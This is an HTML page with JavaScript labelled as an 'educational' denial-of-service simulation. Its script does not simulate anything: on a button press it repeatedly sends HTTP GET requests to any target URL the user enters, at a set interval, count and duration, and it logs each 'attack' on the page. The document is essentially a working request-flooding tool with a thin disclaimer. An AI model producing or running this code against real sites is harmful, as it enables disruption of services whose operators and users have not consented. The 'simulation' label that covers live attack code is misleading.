<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced DoS Attack Simulation</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: url('bg.jpg') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 20px;
            text-align: center;
            color: #000;
        }

        h1 {
            color: #000;
        }

        label {
            display: block;
            margin: 10px 0;
            color: #000;
        }

        input {
            padding: 10px;
            width: 300px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        p {
            color: #000;
            margin-top: 20px;
        }

        #attackPanel {
            margin-top: 20px;
            text-align: left;
            color: #000;
        }
    </style>
    <script>
        function initiateDoS() {
            var target = document.getElementById("targetWebsite").value;
            var intervalTime = document.getElementById("intervalTime").value;
            var duration = document.getElementById("duration").value;
            var numRequests = document.getElementById("numRequests").value;

            var attackPanel = document.getElementById("attackPanel");

            var interval = setInterval(function() {
                for (var i = 0; i < numRequests; i++) {
                    var xhr = new XMLHttpRequest();
                    xhr.open("GET", target, true);
                    xhr.send();

                    // Display ongoing attack details in the panel
                    attackPanel.innerHTML += `Attack: ${new Date().toLocaleTimeString()} | Duration: ${duration} ms | Requests: ${numRequests}<br>`;
                }
            }, intervalTime);

            setTimeout(function() {
                clearInterval(interval);
                attackPanel.innerHTML += `<br>Attack completed at: ${new Date().toLocaleTimeString()}<br>`;
            }, duration);
        }
    </script>
</head>
<body>
    <h1>Advanced DoS Attack Simulation</h1>
    <label for="targetWebsite">Target Website:</label>
    <input type="text" id="targetWebsite" placeholder="Enter target website URL">
    <label for="intervalTime">Interval Time (ms):</label>
    <input type="number" id="intervalTime" placeholder="Enter interval time in milliseconds" value="1000">
    <label for="duration">Attack Duration (ms):</label>
    <input type="number" id="duration" placeholder="Enter attack duration in milliseconds" value="5000">
    <label for="numRequests">Number of Requests:</label>
    <input type="number" id="numRequests" placeholder="Enter number of requests" value="1">
    <button onclick="initiateDoS()">Start DoS Attack</button>
    <div id="attackPanel"></div>
    <p>This is an educational simulation. Use responsibly and adhere to legal standards.</p>
</body>
</html>
